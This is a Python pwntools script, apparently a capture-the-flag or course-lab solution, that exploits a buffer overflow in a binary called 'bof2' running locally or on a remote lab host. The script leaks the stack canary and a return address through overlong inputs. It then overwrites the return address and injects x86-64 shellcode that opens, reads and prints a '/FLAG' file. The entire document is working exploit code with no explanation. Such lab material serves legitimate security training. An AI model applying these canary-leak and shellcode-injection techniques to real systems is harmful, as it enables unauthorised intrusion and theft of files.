#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['gnome-terminal', '--']

exe = './bof2'
port = 10259

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

asm_code = """
mov rax, 0x00000047414c462f
push rax

mov rax, 0x00000047414c462f
push rax

mov rax, 0x02
mov rdi, rsp
mov rsi, 0
syscall

mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx

mov rdi, rax
mov rax, 0x0
mov rsi, rsp
mov rdx, 40
syscall

mov rax, 0x1
mov rdi, 0x1
syscall

mov rax, 0x3c
mov rdi, 0x0
syscall
"""

sc = asm(asm_code)

r.sendafter(b'name? ', b'A' * 41)
r.recvuntil(b'A' * 41)
canary = r.recvuntil(b'\n')[:-1]
print('canary:', canary)
if len(canary) != 13:
    print('the length of the canary is not 13, try again!')
    exit(1)

r.sendafter(b'number? ', b'A' * 56)
r.recvuntil(b'A' * 56)
RA = r.recvuntil(b'\n')[:-1]
RA = int.to_bytes(int.from_bytes(RA, 'little') + 829155, 8, 'little')
print('RA:', RA)

r.sendafter(b'name? ', b'A' * 32 + b'\x01' + b'\x00' * 8 + canary + b'\x00\x00' + RA)

r.sendafter(b'message: ', sc)

r.recvuntil(b'you!\n')

print(r.recvuntil(b'\n')[:-1])
